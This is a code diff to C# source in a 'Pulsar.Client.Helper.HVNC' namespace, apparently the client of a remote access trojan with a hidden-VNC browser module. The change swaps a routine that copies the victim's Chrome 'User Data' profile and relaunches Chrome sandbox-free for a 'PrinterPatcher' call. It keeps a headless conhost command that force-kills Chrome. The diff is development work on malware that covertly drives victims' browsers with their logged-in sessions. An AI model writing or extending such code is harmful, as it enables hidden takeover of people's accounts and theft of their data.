@@ -1,4 +1,5 @@
 ﻿using Microsoft.Win32;
+using Pulsar.Client.Helper.HVNC.Chrome;
 using System;
 using System.Collections.Concurrent;
 using System.Diagnostics;
@@ -299,23 +300,23 @@ namespace Pulsar.Client.Helper.HVNC
                     return;
                 }
 
-                string sourceDir = Path.Combine(path, "User Data");
-                string text = Path.Combine(path, "fudasf");
+                //string sourceDir = Path.Combine(path, "User Data");
+                //string text = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "\\FakeAppData");
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                if (!Directory.Exists(text))
-                {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(filePath);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.Startchrome();
-                }
+                this.CreateProc(filePath);
+                //if (!Directory.Exists(text))
+                //{
+                //    Directory.CreateDirectory(text);
+                //    this.CreateProc(filePath);
+                //    this.CloneDirectory(sourceDir, text);
+                //}
+                //else
+                //{
+                //    DeleteFolder(text);
+                //    this.Startchrome();
+                //}
 
-                string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-dir=\"" + text + "\"";
-                this.CreateProc(filePath2);
+                PrinterPatcher.Start();
             }
             catch (Exception ex)
             {
